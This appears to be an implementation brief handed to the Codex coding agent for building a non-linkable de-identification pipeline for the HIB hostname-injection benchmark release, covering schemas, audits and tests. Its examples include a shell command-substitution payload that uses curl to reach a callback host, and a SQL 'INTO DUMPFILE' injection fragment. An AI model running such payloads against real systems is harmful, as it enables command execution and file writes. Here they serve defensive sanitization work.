# Codex Implementation Brief: Non-Linkable HIB De-Identification and Anonymization

This file is a handoff prompt for Codex. Its job is to implement the HIB release
de-identification process in a way that will satisfy skeptical IEEE S&P
reviewers who care about both benchmark utility and privacy leakage.

The key policy change is non-negotiable:

> Private raw-hostname linkage facts must not be released. If private rows share
> a raw hostname, that fact must not be observable through duplicate public
> hostnames, public canonical forms, stable public hostname hashes, stable
> public hostname IDs, row order, or public audit counts.

The fidelity requirement is also non-negotiable:

> The released hostname-like string should be as similar to the private hostname
> as privacy allows. Do not replace whole hostnames with generic placeholders
> when only a few spans are sensitive. Preserve non-sensitive characters,
> delimiters, label boundaries, encodings, marker syntax, parser behavior, and
> approximate or exact shape unless doing so exposes sensitive information or
> cross-row linkage.

Older planning files in this workspace sometimes mention stable
`dedup_hostname_id`, stable tenant surrogates, or stable unique-host hashes.
Those are acceptable only inside private audit artifacts. They must not appear
in the public release if they let a reviewer or adversary reconstruct repeated
website access patterns, per-tenant browsing patterns, or hostname frequency
profiles.

## Objective

Build a public HIB release pipeline that gives reviewers and researchers enough
information to reproduce the paper's row-level detector evaluation while
preventing release users from learning:

- which tenants, organizations, services, users, devices, domains, or websites
  appear in the private telemetry;
- whether two released rows came from the same original hostname;
- whether a particular organization or website is present in the corpus;
- tenant-specific or user-specific access frequency and time-series patterns;
- raw callback domains, live exploit infrastructure, secrets, tokens, or
  internal network names;
- current production detector internals that would materially help evasion.

The release should preserve:

- every non-sensitive character byte-for-byte where safe;
- the injection-relevant syntax of each row;
- parser and canonicalization behavior relevant to CCD;
- DNS label count, delimiter positions, casing pattern, encoding style, and
  length/character-class shape as tightly as privacy permits;
- label, evidence-tier, split, source-family, sink-family, and score behavior;
- fixed-FPR evaluation reproducibility;
- aggregate auditability of the paper's claims.

Use the term "de-identified release" in public documentation unless a legal or
privacy review explicitly approves the stronger word "anonymized." True
anonymization is difficult to prove.

## Reviewer Success Criteria

A scrutinizing reviewer should be able to say:

1. The release is not a sampled toy set and not a synthetic-only surrogate.
2. The same row-level evaluation can be recomputed from released records,
   labels, splits, detector outputs, and scripts.
3. The public strings preserve attack-relevant structure without exposing raw
   private domains, tenants, users, service names, callback domains, or tokens.
4. Private raw-hostname linkage facts are intentionally non-linkable and
   unreleased in the public release.
5. Sanitization is minimal: only sensitive spans are replaced, and replacements
   preserve the original span's shape as closely as possible.
6. Row order, time buckets, tenant buckets, and IDs do not reveal website access
   patterns.
7. The authors ran automated and manual privacy audits, and the release includes
   machine-readable audit reports.
8. The public data card clearly separates public replay checks from private
   aggregate attestations and non-claims.

## Public Release Must Not Contain

Do not release any of the following fields or any reversible transform of them:

- raw hostname;
- raw canonical hostname;
- stable deduplicated hostname ID;
- stable unique-host hash;
- stable hash of raw or canonical hostname;
- raw tenant ID;
- stable tenant ID if it enables tenant-level time series or access-pattern
  reconstruction;
- exact timestamp;
- raw URL, path, query, referrer, user agent, IP address, ticket ID, alert ID,
  incident ID, employee/user/device ID, email, secret, token, key, GUID, UUID,
  internal service name, cloud account ID, internal suffix, private TLD, or live
  callback domain;
- row ordering that preserves original temporal order inside a tenant, source,
  or host group;
- long exact counts for tiny private strata when those counts identify a
  tenant, customer, incident, or website.

If a field is needed only to prove a paper claim, keep it in a private audit
manifest and expose only aggregate counts, confidence intervals, hashes, or
third-party attestation summaries.

## Public Release Schema

Implement a public row schema like this. Adjust names to the repository style,
but preserve the privacy properties.

```json
{
  "public_row_id": "row_01H7Y1K9FK8Q4VDP2W9A",
  "released_artifact": "row-specific structure-preserving hostname artifact",
  "released_canonical_artifact": "canonical form computed after release transform",
  "source_family": "login_host|dns_host|other_coarse_source",
  "time_bucket": "2025-W31",
  "split": "train|validation|calibration|test|production_replay",
  "label": "resolved_benign|verified_executable_semantics|unresolved",
  "evidence_tier": "none|syntax_only|artifact_supported|sink_evaluated|sink_executed_or_crash_confirmed|impact_confirmed",
  "sink_family": "none|shell|template|query|alert_action|url_fetch|parser",
  "obfuscation_family": "none|percent|unicode|delimiter|base64|quote_comment|mixed",
  "released_length_bucket": "1-15|16-31|32-63|64-127|128+",
  "character_class_mask": "coarse mask, not exact raw value",
  "detector_outputs": {
    "ccd_score_bin": "binned or exact if safe",
    "ccd_flag": true,
    "regex_waf_flag": false,
    "baseline_flags_or_scores": "only if release-safe"
  },
  "row_integrity_hash": "sha256 over released public row payload"
}
```

Do not include `tenant_surrogate`, `unique_host_hash`, or
`dedup_hostname_id` in the public row schema unless a privacy review explicitly
approves a non-linkable version. If reviewers need tenant-disjoint or
deduplication assurance, provide aggregate split manifests and private-origin
attestation hashes instead of row-level stable identifiers.

## Private-Only Artifacts

Keep these files outside the public release:

- raw input snapshot;
- private-to-public row mapping;
- raw-to-released token mapping;
- stable raw hostname groups;
- stable tenant groups;
- exact per-tenant or per-host time series;
- salts, HMAC keys, RNG seeds, and mapping tables;
- raw downstream sink traces;
- raw adjudication notes that include private strings.

Private-only artifacts may be used to produce aggregate audit reports. They must
not be zipped into the public artifact, committed to a public repository, or
shown in reviewer-visible examples.

## Pipeline Overview

Implement the pipeline as explicit stages:

1. Freeze private input snapshot.
2. Minimize fields.
3. Classify sensitive tokens and payload syntax.
4. Generate per-row non-linkable replacement seeds.
5. Transform each artifact with row-specific surrogates.
6. Canonicalize the released artifact.
7. Recompute released-row detector inputs and outputs.
8. Generate public manifests and aggregate private-origin attestations.
9. Run privacy, non-linkability, utility, and reproducibility audits.
10. Build the public release bundle and data card.

Each stage must write a machine-readable manifest and must fail closed on audit
errors.

## Stage 0: Freeze Inputs

Create a release manifest before transforming data:

```json
{
  "release_version": "hib-v1.0",
  "private_eval_snapshot_id": "eval-freeze-YYYY-MM-DD",
  "private_eval_snapshot_sha256": "private or withheld hash",
  "paper_pdf_sha256": "sha256 of the PDF this release supports",
  "anonymizer_version": "anon-v1.0.0",
  "policy_version": "non-linkable-release-policy-v1.0",
  "created_at_utc": "YYYY-MM-DDTHH:MM:SSZ",
  "approvals": {
    "security": "pending|required",
    "privacy": "pending|required",
    "legal_or_data_owner": "pending|required"
  }
}
```

Requirements:

- input snapshot is immutable;
- transformations are deterministic only when run with private secrets;
- no public file contains the private secrets;
- all randomization is reproducible internally from private keys for audit;
- public release versioning is explicit.

## Stage 1: Field Minimization

Remove everything not required for row-level detector evaluation.

Keep only:

- public row ID;
- released artifact string;
- released canonical artifact;
- coarse source family;
- coarse time bucket or window bucket;
- split assignment;
- row label and evidence tier;
- sink and obfuscation family labels if needed for evaluation;
- detector outputs needed to reproduce tables;
- released row integrity hash.

Do not keep:

- exact source system identifiers;
- tenant ID or stable tenant pseudonym;
- raw event IDs;
- exact timestamps;
- raw downstream sink metadata;
- raw alert/incident/ticket context;
- raw hostnames or raw canonical hostnames;
- stable dedup host IDs or stable host hashes.

If a paper result requires tenant-level or dedup-host counts, place only
aggregate counts and private attestation hashes in `data/audits/`, not row-level
linkage fields in the public data.

## Stage 2: Public Row IDs

Generate public row IDs from private row IDs, not from hostname content.

Recommended construction:

```text
public_row_id = "row_" || base32(HMAC-SHA256(row_id_secret, release_version || private_row_id))[0:20]
```

Rules:

- never release `row_id_secret`;
- never derive public row IDs from raw or canonical hostnames;
- never sort the release by `private_row_id`, timestamp, tenant, or hostname;
- shuffle public row order using a release-specific private shuffle key;
- verify that public row ID lexical order does not reveal time, tenant, source,
  or hostname grouping.

## Stage 3: Time and Source Generalization

Release time only as coarse buckets.

Recommended:

- week-level buckets for most rows, e.g. `2025-W31`;
- month-level buckets if a source/label bucket is sparse;
- no exact day/hour/minute unless required for a specific public experiment;
- no original row order.

Run a k-anonymity check for every released combination:

```text
(time_bucket, source_family, label, evidence_tier, sink_family)
```

Acceptance:

- every released combination should contain at least `k=50` rows, or be merged
  into a coarser bucket;
- for rare positive sink families, use coarser time buckets or suppress the
  time field entirely;
- never expose a per-tenant time series.

## Stage 4: Token Classification

Build a tokenizer/classifier that marks each artifact span before replacement.

At minimum classify:

- DNS labels and suffixes;
- known public domains;
- internal domains and private suffixes;
- tenant/customer/service/team names;
- usernames, emails, account IDs, device IDs;
- IPv4 and IPv6 addresses;
- GUIDs, UUIDs, long hex/base64/base32 tokens;
- API keys, JWTs, OAuth tokens, signed URLs, session IDs, bearer-like strings;
- ports, paths, query strings, fragments;
- shell metacharacters and command substitutions;
- SQL quote/comment/delay/error markers;
- template delimiters and expression markers;
- URL fetch or callback patterns;
- percent, UTF-8, punycode, mixed-case, confusable, and delimiter encodings.

Classification output is private audit metadata unless a coarse public version
is needed. Do not release token values or stable token IDs.

## Stage 5: Non-Linkable Artifact Transformation

This is the most important implementation requirement.

For each row, derive a row-specific RNG seed:

```text
row_secret_seed = HMAC-SHA256(artifact_secret, release_version || private_row_id || "artifact")
```

For each token occurrence, derive an occurrence-specific seed:

```text
occ_seed = HMAC-SHA256(row_secret_seed, token_index || token_class || "occurrence")
```

Use `occ_seed` to generate replacement labels, domains, IDs, path components,
and inert callback names. Do not use the raw token value as the public
replacement key. The same private hostname appearing in two rows must produce
different public artifacts because the row seeds differ.

### Replacement Rules

Use minimal, span-level rewriting. The anonymizer should first decide whether a
span is safe to leave unchanged. If it is not sensitive and not linkability
creating, preserve it exactly. If it is sensitive, replace only that span and
keep the surrounding hostname bytes unchanged.

Use only reserved or inert namespaces:

- DNS suffixes: `.invalid`, `.example`, `.test`, or `.localhost` where safe;
- documentation IP ranges: `192.0.2.0/24`, `198.51.100.0/24`,
  `203.0.113.0/24`, `2001:db8::/32`;
- callback domains: row-local non-resolving domains under reserved suffixes,
  with the same label count and label-length pattern where feasible;
- tenant/service labels: row-local synthetic labels with the same length,
  casing pattern, digit positions, hyphen positions, and DNS-valid character
  class where feasible;
- user/device tokens: row-local synthetic tokens with the same broad character
  mask and length where feasible;
- secrets/tokens: replace with same broad class and length bucket, never exact
  length if the exact length is identifying.

### Shape-Preserving Replacement Priority

For each sensitive span, preserve as much of the original shape as possible in
this order:

1. Span role and parser position.
2. Separator characters around the span.
3. DNS label count and dot positions.
4. Encoding wrapper and encoding alphabet when safe.
5. Case pattern: lowercase, uppercase, title case, mixed case.
6. Character-class mask: letter, digit, hyphen, underscore, hex, base64-like,
   percent-encoded octet, punycode-like prefix, and so on.
7. Length exactly, unless exact length is itself identifying; otherwise nearest
   safe bucket.
8. Common non-sensitive operational words only if allowlisted, such as
   `prod`, `dev`, `staging`, `api`, `login`, `dns`, `www`, or cloud region
   tokens that are not tenant-specific.

Do not preserve dictionary words, organization names, internal project names,
employee names, customer names, service names, or domain labels merely because
they look syntactically useful. Replace those with row-local synthetic strings
that match the shape.

Examples:

```text
private:  acme-prod-usw2.api.$(curl http://x9.acme-callback.net/a).corp
release:  qira-prod-usw2.api.$(curl http://m4.cb-r9x.invalid/a).test

private:  fd-dwebapp-703';%20SELECT%20'hello'%20INTO%20DUMPFILE%20'.customer.example
release:  fd-jxqvapp-481';%20SELECT%20'hello'%20INTO%20DUMPFILE%20'.r7m4qmer.example

private:  10.14.203.7.internal-service.customerA.local
release:  192.0.2.7.vxqerpal-xmrvqce.nolevatuQ.test
```

The examples are illustrative. The actual generator should avoid recognizable
words and should use row-local randomness while matching shape. If preserving a
safe word such as `prod` or `api` helps utility, preserve it; if the word is
tenant-specific or rare, replace it.

Preserve:

- all non-sensitive spans exactly;
- DNS label boundaries and label count where safe;
- delimiter positions when needed for parser behavior;
- quote, brace, command-substitution, comment, and template markers;
- encoding style where it affects detector behavior;
- exact or nearest-safe length;
- character class mask at the finest safe level;
- sink-family and obfuscation-family semantics.

Do not preserve:

- exact domain label identity;
- exact private suffix;
- exact token string;
- exact tenant, user, or service name;
- exact global duplicate pattern;
- exact cross-row token reuse.

### Field-Specific Similarity Rules

- Domain names: preserve number of labels, dot placement, hyphen placement, and
  label lengths where safe; replace sensitive labels with row-local generated
  labels; use reserved suffixes.
- IP addresses: preserve IPv4 vs IPv6, address position, separators, and
  formatting style; replace values with documentation ranges.
- Ports: preserve if not sensitive and needed for parser behavior; otherwise
  bucket or replace with an inert documentation value.
- Paths/query fragments embedded in host-like artifacts: preserve delimiters,
  parameter structure, quote/comment markers, and encoding; replace sensitive
  values.
- Secrets/tokens: preserve only broad class and safe length bucket; do not
  preserve exact token body or checksum-looking suffixes.
- Encoded spans: decode only for classification in private memory; output should
  preserve the same encoding style if safe, with encoded synthetic content.
- Unicode/confusables: preserve the presence and class of confusable behavior,
  but not sensitive names encoded with confusables.

### Within-Row Repetition

Default to per-occurrence replacement even within a row. Preserve within-row
repetition only when it is necessary for parser or sink semantics, and record
that decision in private audit metadata. If preserved, the repetition must not
create a cross-row linkage because the replacement is still row-local.

### Duplicate Hostname Policy

For every private canonical hostname group with size greater than 1:

- every row in the group must have a different `released_artifact`;
- every row in the group must have a different `released_canonical_artifact`;
- no public row field may identify that these rows belong to the same private
  hostname group;
- no public hash may be computed from the raw or canonical private hostname;
- no public multiplicity count may be attached to a row;
- no public row order may reveal the group.

If preserving exact syntax would cause duplicate released artifacts, add
the smallest possible row-local inert variation that breaks linkage without
changing the sink-family label or detector-relevant structure. Prefer replacing
sensitive labels with different same-shape synthetic labels. If that is
insufficient, use row-local reserved labels, row-local documentation-domain
components, harmless padding labels within DNS length rules, or row-local inert
path fragments when a path exists. Do not introduce large generic placeholders
that make the hostname unlike the original.

## Stage 6: Canonicalization After Transformation

Compute `released_canonical_artifact` from `released_artifact`, not by
transforming the private canonical artifact directly.

This ensures reviewers can run the public normalizer and reproduce the released
canonical form.

Audit:

- private normalizer path vs released normalizer path;
- private sink-family label vs released sink-family label;
- private obfuscation-family label vs released obfuscation-family label;
- private detector flag vs released detector flag;
- private score/rank vs released score/rank if scores are recomputed.

Expected utility thresholds should be chosen before running the audit. Suggested
starting thresholds:

- unchanged-safe-span preservation: at least 99.9 percent;
- sensitive-span shape preservation: at least 99.0 percent exact character-class
  mask agreement and at least 99.0 percent exact or nearest-safe length
  agreement;
- DNS label-count preservation: at least 99.5 percent except where a reserved
  suffix replacement requires a documented change;
- normalizer-path preservation: at least 99.0 percent;
- sink-family preservation: at least 99.0 percent;
- evidence-tier preservation: at least 99.0 percent;
- CCD flag agreement at paper threshold: at least 99.0 percent;
- score rank Spearman correlation on a private audit sample: at least 0.95.

If these thresholds fail, revise the transform or make the paper claim narrower.

## Stage 7: Detector Outputs and Baselines

For reviewer reproducibility, prefer recomputing detector outputs from released
artifacts. If exact production scores cannot safely be released:

- release binned scores;
- release flags at the paper thresholds;
- release threshold manifests;
- release scripts that recompute public-release metrics;
- explain which values are public replay outputs versus private production
  outputs.

Do not release current live model weights, current live priors, current live
thresholds, or active evasion-sensitive taxonomy leaves unless security review
approves.

## Required Output Files

Implement or update these files:

```text
configs/anonymization_policy.public.yaml
configs/anonymization_policy.private.example.yaml
scripts/anonymize_hib_release.py
scripts/verify_anonymization.py
scripts/build_release_bundle.py
tests/test_anonymization_nonlinkability.py
tests/test_anonymization_privacy.py
tests/test_anonymization_utility.py
data/audits/anonymization_audit_report.json
data/audits/anonymization_audit_report.md
data/audits/nonlinkability_audit_report.json
data/audits/nonlinkability_audit_report.md
data/audits/release_data_card.md
```

If the repository uses a different layout, keep the same logical artifacts.

## Required Public Policy YAML

`configs/anonymization_policy.public.yaml` should include:

```yaml
release_version: hib-v1.0
policy_version: non-linkable-release-policy-v1.0
public_release_principles:
  - preserve_attack_relevant_structure
  - remove_direct_identifiers
  - prevent_cross_row_hostname_linkage
  - prevent_tenant_or_website_access_pattern_reconstruction
  - neutralize_live_callbacks_and_executable_payloads
forbidden_public_fields:
  - raw_hostname
  - raw_canonical_hostname
  - dedup_hostname_id
  - unique_host_hash
  - stable_hostname_hash
  - raw_tenant_id
  - stable_tenant_time_series_id
  - exact_timestamp
  - private_mapping_key
replacement_namespaces:
  dns_suffixes:
    - invalid
    - example
    - test
  ipv4_documentation_ranges:
    - 192.0.2.0/24
    - 198.51.100.0/24
    - 203.0.113.0/24
  ipv6_documentation_ranges:
    - 2001:db8::/32
minimum_public_k:
  time_source_label_tier_sink: 50
utility_thresholds:
  unchanged_safe_span_preservation_min: 0.999
  sensitive_span_character_mask_preservation_min: 0.99
  sensitive_span_length_preservation_or_nearest_safe_min: 0.99
  dns_label_count_preservation_min: 0.995
  delimiter_position_preservation_min: 0.995
  encoding_style_preservation_min: 0.99
  normalizer_path_preservation_min: 0.99
  sink_family_preservation_min: 0.99
  evidence_tier_preservation_min: 0.99
  ccd_flag_agreement_min: 0.99
  ccd_score_spearman_min: 0.95
manual_review:
  minimum_rows: 10000
  minimum_reviewers: 2
```

Do not put secrets, salts, private paths, raw examples, or tenant names in this
public YAML.

## Non-Linkability Audit

Create `data/audits/nonlinkability_audit_report.json` with at least:

```json
{
  "release_version": "hib-v1.0",
  "n_public_rows": 0,
  "private_origin_linkage_checks": {
    "raw_hostname_group_counts_released": false,
    "raw_hostname_group_existence_released": false,
    "raw_hostname_multiplicity_released": false,
    "stable_hostname_identifier_fields_released": false,
    "status": "pass"
  },
  "public_uniqueness_checks": {
    "n_duplicate_released_artifact_values": 0,
    "n_duplicate_released_canonical_values": 0,
    "n_forbidden_stable_hostname_ids": 0,
    "n_forbidden_stable_hostname_hashes": 0,
    "status": "pass"
  },
  "access_pattern_checks": {
    "row_order_reveals_private_time": false,
    "row_order_reveals_private_tenant": false,
    "time_source_label_tier_sink_min_k": 50,
    "n_sparse_public_combinations": 0,
    "n_public_tenant_time_series_fields": 0,
    "status": "pass"
  },
  "structural_fingerprint_checks": {
    "fingerprint_definition": "length_bucket + character_class_mask + delimiter_mask + source_family + label + sink_family + obfuscation_family",
    "private_raw_hostname_group_results_released": false,
    "n_global_fingerprints_below_k": 0,
    "status": "pass"
  },
  "website_access_pattern_audit": {
    "raw_hostname_group_counts_released": false,
    "raw_hostname_group_existence_released": false,
    "raw_hostname_group_sizes_released": false,
    "stable_hostname_identifier_fields_released": false,
    "status": "pass"
  }
}
```

The structural fingerprint check is important. Even if public artifacts differ,
identical rare masks can still leak private access patterns. If a rare
fingerprint appears during private verification, coarsen fields, add row-local
inert variation, or suppress the risky public feature. Public reports must not
publish raw-hostname group counts, group sizes, existence indicators, or
per-group results from private input.

## Privacy and Safety Audits

Create `data/audits/anonymization_audit_report.json` with checks for:

- raw tenant/customer names: 0 confirmed release blockers;
- emails, usernames, user IDs, device IDs: 0 confirmed release blockers;
- IP addresses outside documentation ranges: 0;
- secrets/API keys/JWTs/tokens/signed URLs: 0;
- raw internal suffixes/private TLDs: 0;
- live callback domains: 0;
- public DNS or certificate-transparency links to private organizations: 0
  confirmed release blockers;
- exact raw hostname strings in public data: 0;
- exact raw canonical hostname strings in public data: 0;
- executable payloads that would execute as-is in common shells/templates/SQL:
  0 unsafe cases after inerting;
- manual privacy review blockers: 0.

Use multiple scanners:

- regex and entropy detectors for secrets;
- `detect-secrets` or equivalent;
- `trufflehog` or equivalent if available;
- custom domain/IP/email/GUID/token scanners;
- public DNS and certificate-transparency lookup for domain-like outputs;
- exact-match private raw string scanner against released files;
- manual stratified review.

Manual review sample:

- at least 10,000 rows;
- at least two reviewers;
- stratify by label, source, sink family, rare length bucket, rare character
  mask, high-risk token class, and highest detector score bins;
- record blocker count, adjudication count, and examples only in sanitized form.

## Utility and Reproducibility Audits

Create utility checks that compare private pre-transform rows to public
post-transform rows in aggregate:

```json
{
  "unchanged_safe_span_preservation_rate": 0.0,
  "sensitive_span_character_mask_preservation_rate": 0.0,
  "sensitive_span_length_preservation_or_nearest_safe_rate": 0.0,
  "dns_label_count_preservation_rate": 0.0,
  "delimiter_position_preservation_rate": 0.0,
  "encoding_style_preservation_rate": 0.0,
  "normalizer_path_preservation_rate": 0.0,
  "sink_family_preservation_rate": 0.0,
  "evidence_tier_preservation_rate": 0.0,
  "label_preservation_rate": 0.0,
  "ccd_flag_agreement_at_paper_threshold": 0.0,
  "ccd_score_spearman_private_vs_public_sample": 0.0,
  "fixed_fpr_metric_reproduction_delta": 0.0,
  "status": "pass|fail"
}
```

The released benchmark should include scripts that recompute:

- row counts by split, source family, label, and evidence tier;
- calibration threshold from benign calibration rows only;
- TPR/FPR over resolved rows;
- unresolved-row accounting;
- detector overlap tables;
- public-anchor replay checks if included.

If public de-identification changes the exact score distribution, document the
delta and adjust claims. Do not hide a utility degradation.

## Anonymization Shortcut Audit

Train a classifier using only anonymizer artifacts:

- replacement token classes;
- replacement token positions;
- length buckets;
- character-class masks;
- number of redactions;
- whether a field was suppressed;
- released source family and time bucket if public.

This classifier must not see the released raw characters that encode actual
payload semantics. It is testing whether the anonymizer itself leaks labels.

Acceptance:

- AUROC near chance;
- TPR at `1e-4` FPR near zero;
- no single anonymizer action should nearly determine the positive label.

If it performs well, revise the anonymizer. Common fixes:

- use the same replacement style for benign and positive rows;
- avoid marker names like `PAYLOAD_TOKEN`;
- coarsen length/action-count fields;
- remove source fields that encode labels;
- balance public placeholder distributions.

## Membership and Access-Pattern Audit

Implement a specific audit for the user's concern: website access patterns.

Checks:

1. Use private-only linkage checks to verify that released artifacts and
   canonical artifacts cannot be joined back to a shared raw hostname.
2. Verify that no public stable ID or hash groups private-origin rows.
3. Verify that public row order does not preserve private input order.
4. Verify that released time buckets do not let a user infer private visit
   sequences.
5. Verify that released source and label fields do not create rare combinations
   that identify private-origin linkage sets.
6. Verify that structural fingerprints are not unique or rare for private-origin
   linkage sets.

Report:

```json
{
  "website_access_pattern_audit": {
    "raw_hostname_group_counts_released": false,
    "raw_hostname_group_existence_released": false,
    "raw_hostname_group_sizes_released": false,
    "stable_hostname_identifier_fields_released": false,
    "status": "pass"
  }
}
```

Any failed private linkability check is a release blocker unless explicitly
approved and documented. Do not publish the private counts, group sizes,
existence results, or per-group details that caused the failure.

## Tests Codex Should Implement

At minimum implement tests equivalent to:

```python
def test_duplicate_private_hostnames_map_to_distinct_public_artifacts():
    ...

def test_duplicate_private_hostnames_map_to_distinct_public_canonical_artifacts():
    ...

def test_no_public_stable_hostname_identifier_fields():
    ...

def test_public_row_ids_not_derived_from_hostname():
    ...

def test_no_raw_hostname_exact_matches_in_release():
    ...

def test_no_raw_canonical_hostname_exact_matches_in_release():
    ...

def test_no_public_rows_sorted_by_private_time_tenant_or_hostname():
    ...

def test_sparse_public_time_source_label_combinations_are_coarsened():
    ...

def test_reserved_domains_only_for_generated_domains():
    ...

def test_documentation_ip_ranges_only_for_generated_ips():
    ...

def test_no_secrets_tokens_emails_private_ips_or_internal_suffixes():
    ...

def test_payload_markers_preserved_where_required():
    ...

def test_non_sensitive_spans_preserved_exactly():
    ...

def test_sensitive_replacements_preserve_shape():
    ...

def test_dns_label_count_and_delimiters_preserved_where_safe():
    ...

def test_encoded_sensitive_spans_keep_encoding_style():
    ...

def test_callbacks_are_inert():
    ...

def test_anonymization_shortcut_classifier_near_chance():
    ...
```

Use synthetic fixtures in tests; do not include private raw rows in the test
repository.

## Implementation Notes

Recommended structure for `scripts/anonymize_hib_release.py`:

1. Load private input and private config.
2. Validate that required private columns exist.
3. Drop forbidden public columns.
4. Generate public row IDs.
5. Shuffle rows using private shuffle key.
6. Tokenize and classify artifact spans.
7. Replace each token using row-local and occurrence-local seeds.
8. Neutralize callback and executable contexts.
9. Canonicalize released artifact.
10. Recompute detector features/scores/flags as configured.
11. Write public release rows.
12. Write private audit sidecars.
13. Run verification or fail.

Recommended CLI:

```sh
python3 scripts/anonymize_hib_release.py \
  --input-private data/private/hib_eval_snapshot.parquet \
  --private-config configs/anonymization_policy.private.yaml \
  --public-policy configs/anonymization_policy.public.yaml \
  --output data/release/hib_release.parquet \
  --audit-dir data/audits

python3 scripts/verify_anonymization.py \
  --private-input data/private/hib_eval_snapshot.parquet \
  --public-release data/release/hib_release.parquet \
  --audit-dir data/audits \
  --policy configs/anonymization_policy.public.yaml
```

The private input path and private config must never be included in the public
artifact bundle.

## Public Bundle Contents

The public bundle should contain:

```text
data/release/hib_release.parquet
data/release/hib_release.schema.json
data/release/hib_release.sha256
data/audits/anonymization_audit_report.json
data/audits/anonymization_audit_report.md
data/audits/nonlinkability_audit_report.json
data/audits/nonlinkability_audit_report.md
data/audits/release_data_card.md
configs/anonymization_policy.public.yaml
scripts/verify_anonymization.py
scripts/recompute_metrics.py
README.md
```

Do not include:

- private config;
- salts or keys;
- private input;
- private mapping tables;
- raw examples;
- stable dedup hostname IDs;
- stable hostname hashes;
- exact tenant or website time series.

## Reviewer-Facing Data Card Text

Include language like this in `release_data_card.md`:

```markdown
### Non-Linkability of Repeated Hostnames

The public release intentionally does not preserve stable hostname identity
across rows. If the same private canonical hostname appears multiple times in
the evaluated telemetry, each occurrence is transformed with a row-specific
secret seed and receives a different released artifact and released canonical
artifact. The release contains no stable public deduplicated-hostname ID, no
stable hostname hash, and no row-level multiplicity field. This prevents the
public dataset from exposing website access patterns or hostname frequency
profiles while preserving row-level detector evaluation.

Deduplication-dependent paper claims are supported by private-origin aggregate
manifests, split/leakage attestations, and reproducible public row-level
metrics, not by public row-level hostname linkage.
```

Also include:

```markdown
### What the Release Supports

The release supports row-level replay of the benchmark task: loading released
artifacts, applying the public canonicalizer, recomputing detector outputs where
configured, and reproducing TPR/FPR and overlap metrics under the published
split and threshold protocol.

### What the Release Does Not Support

The release does not support reconstructing raw hostnames, linking repeated
private hostname occurrences, reconstructing tenant or website access time
series, identifying tenants or services, or auditing raw private telemetry.
Private-origin claims that require those fields are reported only as aggregate
counts, hashes, and audit attestations.
```

## Paper Wording to Keep Consistent

If the public schema is updated to remove stable tenant or hostname surrogates,
update the paper so it does not claim those row-level fields are public. Prefer:

```text
Released fields include the de-identified raw artifact, canonicalized form,
coarse timestamp bucket, label, split assignment, evidence tier, detector
outputs, hashes over released rows, and benchmark scripts. Private
raw-hostname linkage fields are withheld; row-specific transformations prevent
public records and public audits from revealing raw-hostname recurrence facts.
```

Avoid saying:

```text
Released fields include tenant surrogate and unique-host hash.
```

unless those fields are provably non-linkable and approved for public release.

## Fail-Closed Rules

The release builder must fail if:

- any forbidden public field is present;
- any raw hostname exactly appears in public data;
- any raw canonical hostname exactly appears in public data;
- any private-origin linkage set maps to linkable public artifacts;
- any private-origin linkage set maps to linkable public canonical artifacts;
- any stable public hostname ID/hash exists;
- any non-documentation IP address exists;
- any generated domain resolves publicly or appears in certificate
  transparency;
- any token scanner finds a confirmed secret;
- any manual privacy review finds a release blocker;
- any sparse public time/source/label/evidence/sink bucket violates the k
  threshold;
- safe non-sensitive spans are unnecessarily rewritten;
- sensitive replacements fail the predeclared shape-preservation thresholds;
- wholesale generic placeholders replace hostnames that could have been
  minimally sanitized;
- utility metrics fall below predeclared thresholds and the paper is not
  updated to state the narrower claim.

## Final Checklist for Codex

Before declaring this task complete, Codex must produce:

- public policy YAML with no secrets;
- anonymizer script;
- verifier script;
- tests for non-linkability, privacy, safety, and utility;
- public release schema;
- anonymization audit JSON and Markdown;
- non-linkability audit JSON and Markdown;
- release data card;
- command transcript or reproduction instructions;
- SHA-256 hashes for release files;
- measured safe-span preservation, shape-preservation, delimiter-preservation,
  label-count-preservation, and encoding-preservation rates;
- a short summary of any utility degradation caused by non-linkable
  de-identification;
- a list of paper text that must be updated if the current PDF still claims
  public stable tenant or dedup-hostname surrogates.

The implementation is not done until the duplicate-hostname non-linkability
audit passes with zero public-linkability blockers.
